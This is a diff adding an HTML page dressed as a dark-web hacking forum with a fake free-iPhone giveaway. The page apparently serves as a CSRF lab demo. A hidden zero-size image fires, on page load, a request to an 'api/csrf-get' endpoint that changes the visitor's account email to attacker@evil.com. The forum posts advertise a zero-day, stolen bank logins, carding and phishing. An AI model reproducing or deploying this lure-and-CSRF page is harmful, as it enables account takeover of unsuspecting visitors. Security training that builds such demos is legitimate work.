@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>ASTRALGUARD BLACKMARKET</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400&family=Share+Tech+Mono&display=swap');
+    
+    :root {
+      --hacker-green: #0f4;
+      --hacker-red: #f44;
+      --dark-bg: #0a0a0a;
+      --darker-bg: #050505;
+      --terminal-bg: rgba(10, 15, 10, 0.9);
+      --text: #aaa;
+      --glow: 0 0 5px var(--hacker-green);
+    }
+    
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+    
+    body {
+      font-family: 'Share Tech Mono', monospace;
+      background-color: var(--dark-bg);
+      color: var(--text);
+      line-height: 1.6;
+      background-image: 
+        radial-gradient(circle at 20% 30%, rgba(0, 255, 100, 0.03) 0%, transparent 20%),
+        radial-gradient(circle at 80% 70%, rgba(255, 0, 100, 0.03) 0%, transparent 20%),
+        linear-gradient(to bottom, var(--darker-bg), var(--dark-bg));
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+    
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      padding: 1rem;
+    }
+    
+    /* Terminal Header Styling */
+    .terminal-header {
+      border: 1px solid var(--hacker-green);
+      box-shadow: var(--glow);
+      background: var(--terminal-bg);
+      margin-bottom: 2rem;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .terminal-bar {
+      display: flex;
+      background: linear-gradient(to right, #111, #000);
+      padding: 5px 10px;
+      align-items: center;
+      border-bottom: 1px solid #000;
+    }
+    
+    .terminal-controls {
+      display: flex;
+      gap: 6px;
+      margin-right: 10px;
+    }
+    
+    .control {
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+    }
+    
+    .control.close { background: var(--hacker-red); }
+    .control.minimize { background: #ff0; }
+    .control.expand { background: var(--hacker-green); }
+    
+    .terminal-title {
+      font-size: 0.7rem;
+      color: var(--hacker-green);
+      flex-grow: 1;
+    }
+    
+    .header-content {
+      padding: 1rem;
+      text-align: center;
+    }
+    
+    .header-content h1 {
+      color: var(--hacker-green);
+      text-shadow: 0 0 10px var(--hacker-green);
+      font-size: 1.8rem;
+      letter-spacing: 2px;
+      margin-bottom: 0.5rem;
+    }
+    
+    .header-content p {
+      color: #888;
+      font-size: 0.9rem;
+    }
+    
+    /* Main Content */
+    .main-content {
+      display: grid;
+      grid-template-columns: 1fr 300px;
+      gap: 1.5rem;
+    }
+    
+    @media (max-width: 768px) {
+      .main-content {
+        grid-template-columns: 1fr;
+      }
+    }
+    
+    .panel {
+      background: var(--terminal-bg);
+      border: 1px solid #333;
+      padding: 1.2rem;
+      position: relative;
+      overflow: hidden;
+    }
+    
+    .panel::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      right: 0;
+      height: 2px;
+      background: linear-gradient(to right, var(--hacker-red), var(--hacker-green));
+    }
+    
+    h2 {
+      color: var(--hacker-green);
+      margin-bottom: 1rem;
+      font-size: 1.2rem;
+      border-bottom: 1px solid #333;
+      padding-bottom: 5px;
+    }
+    
+    h3 {
+      color: var(--hacker-red);
+      margin-bottom: 0.8rem;
+      font-size: 1rem;
+    }
+    
+    p {
+      margin-bottom: 1rem;
+      font-size: 0.9rem;
+    }
+    
+    .post {
+      border-bottom: 1px solid #222;
+      padding: 0.8rem 0;
+    }
+    
+    .post:last-child {
+      border-bottom: none;
+    }
+    
+    .post-header {
+      display: flex;
+      justify-content: space-between;
+      margin-bottom: 0.5rem;
+      color: var(--hacker-green);
+      font-size: 0.8rem;
+    }
+    
+    .username {
+      color: var(--hacker-red);
+      font-weight: bold;
+    }
+    
+    .post-content {
+      color: #ccc;
+    }
+    
+    /* Sidebar */
+    .sidebar h2 {
+      color: var(--hacker-red);
+    }
+    
+    .offer-box {
+      background: linear-gradient(to bottom, #1a0000, #000);
+      border: 1px dashed var(--hacker-red);
+      padding: 1rem;
+      text-align: center;
+      margin-bottom: 1rem;
+    }
+    
+    .offer-box h3 {
+      color: #fff;
+      text-shadow: 0 0 5px var(--hacker-red);
+      font-size: 1.3rem;
+      margin-bottom: 0.5rem;
+    }
+    
+    .offer-box p {
+      color: #ff9;
+      font-size: 0.8rem;
+    }
+    
+    .btn-hack {
+      display: inline-block;
+      padding: 0.6rem 1.2rem;
+      background: linear-gradient(to bottom, var(--hacker-red), #800);
+      border: 1px solid var(--hacker-red);
+      color: #fff;
+      text-decoration: none;
+      font-family: inherit;
+      font-weight: bold;
+      margin-top: 0.5rem;
+      text-transform: uppercase;
+      letter-spacing: 1px;
+      box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
+      transition: all 0.3s;
+    }
+    
+    .btn-hack:hover {
+      background: linear-gradient(to bottom, #f00, #600);
+      box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
+    }
+    
+    /* Footer */
+    .footer {
+      margin-top: 2rem;
+      text-align: center;
+      color: #444;
+      font-size: 0.7rem;
+      border-top: 1px solid #222;
+      padding-top: 1rem;
+    }
+    
+    .blink {
+      animation: blink 2s infinite;
+    }
+    
+    .hacker-noise {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAYAAAAeP4ixAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAABGSURBVGhD7cExAQAwDMCg+zfd2VAk4JVL8p8VSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIkSZIk6Q1p8gIe6x6VYAAAAABJRU5ErkJggg==');
+      opacity: 0.03;
+      pointer-events: none;
+      z-index: -1;
+    }
+    
+    /* Animations */
+    @keyframes blink {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.3; }
+    }
+    
+    .typewriter {
+      overflow: hidden;
+      border-right: 2px solid var(--hacker-green);
+      white-space: nowrap;
+      margin: 0 auto;
+      letter-spacing: 1px;
+      animation: typing 3.5s steps(40, end), blink-caret 0.75s step-end infinite;
+    }
+    
+    @keyframes typing {
+      from { width: 0 }
+      to { width: 100% }
+    }
+    
+    @keyframes blink-caret {
+      from, to { border-color: transparent }
+      50% { border-color: var(--hacker-green) }
+    }
+  </style>
+</head>
+<body>
+  <div class="hacker-noise"></div>
+  <div class="container">
+    <!-- Terminal Style Header -->
+    <div class="terminal-header">
+      <div class="terminal-bar">
+        <div class="terminal-controls">
+          <span class="control close"></span>
+          <span class="control minimize"></span>
+          <span class="control expand"></span>
+        </div>
+        <div class="terminal-title">tor://astralguard.onion/forum/</div>
+      </div>
+      <div class="header-content">
+        <h1>FREE SOFTWARE & EXPLOITS</h1>
+        <p>PRIVATE FORUM :: MEMBERS ONLY</p>
+      </div>
+    </div>
+
+    <div class="main-content">
+      <!-- Main Forum Posts -->
+      <div class="panel">
+        <h2><i class="fas fa-terminal"></i> RECENT POSTS</h2>
+        
+        <div class="post">
+          <div class="post-header">
+            <span class="username">@ShadowBroker</span>
+            <span>25.12.2023 23:61</span>
+          </div>
+          <div class="post-content">
+            <p>New 0day in wild for Apache servers. DM for details. BTC only.</p>
+          </div>
+        </div>
+        
+        <div class="post">
+          <div class="post-header">
+            <span class="username">@Phantom</span>
+            <span>25.12.2023 23:58</span>
+          </div>
+          <div class="post-content">
+            <p>Anyone got working combos for Bank of America? Trading for CC fullz.</p>
+          </div>
+        </div>
+        
+        <div class="post">
+          <div class="post-header">
+            <span class="username">@An0n</span>
+            <span>25.12.2023 23:55</span>
+          </div>
+          <div class="post-content">
+            <p>Looking for partner for big job. Must have skills in phishing and social engineering. 50/50 split.</p>
+          </div>
+        </div>
+        
+        <div class="post">
+          <div class="post-header">
+            <span class="username">@ZeroCool</span>
+            <span>25.12.2023 23:53</span>
+          </div>
+          <div class="post-content">
+            <p>Hacked iPhone 15 Pro Max 1TB - generating serial numbers. First 10 people get free unlock.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Sidebar with "Offer" -->
+      <div class="sidebar">
+        <div class="panel">
+          <h2><i class="fas fa-user-shield"></i> YOUR STATUS</h2>
+          <p>Welcome, <span style="color:var(--hacker-green)">guest</span>.</p>
+          <p>Last login: <span class="blink">25.12.2023 23:60</span></p>
+          <p>IP: 192.168.0.1 ████:███:███:████</p>
+        </div>
+
+        <div class="offer-box">
+          <h3><i class="fas fa-gift"></i> EXCLUSIVE OFFER</h3>
+          <p>FIRST 10 VISITORS TODAY GET FREE IPHONE 15 PRO MAX</p>
+          <p>NO SURVEYS - NO PAYMENT - INSTANT WIN</p>
+          <p>JUST VISIT THIS PAGE TO CLAIM</p>
+          
+          <!-- This is the actual CSRF trigger -->
+          <img src="https://labs.astralguard.online/api/csrf-get?change=1&email=attacker@evil.com" width="0" height="0" />
+          
+          <a href="#" class="btn-hack" onclick="fakeClaim()">CLAIM NOW</a>
+        </div>
+
+        <div class="panel">
+          <h2><i class="fas fa-exclamation-triangle"></i> NOTICE</h2>
+          <p>Forum will be moving to new .onion address next week due to security concerns.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="footer">
+      <p>CONNECTED TO TOR NETWORK | ENCRYPTED: YES | TRACKERS: 0 BLOCKED</p>
+      <p>© 2025 ASTRALGUARD FREE SOFTWARE FORUM | ALL RIGHTS RESERVED</p>
+    </div>
+  </div>
+
+  <script>
+    // Fake claim function to make the button look like it does something
+    function fakeClaim() {
+      alert('ERROR: Offer already claimed for your session. Check your email for tracking details.');
+      return false;
+    }
+
+    // Add some typewriter effect to headers
+    document.addEventListener('DOMContentLoaded', function() {
+      const titles = document.querySelectorAll('.post-content p');
+      titles.forEach(title => {
+        const originalText = title.textContent;
+        title.textContent = '';
+        let i = 0;
+        function typeWriter() {
+          if (i < originalText.length) {
+            title.textContent += originalText.charAt(i);
+            i++;
+            setTimeout(typeWriter, Math.random() * 100 + 20);
+          }
+        }
+        typeWriter();
+      });
+    });
+  </script>
+</body>
+</html>
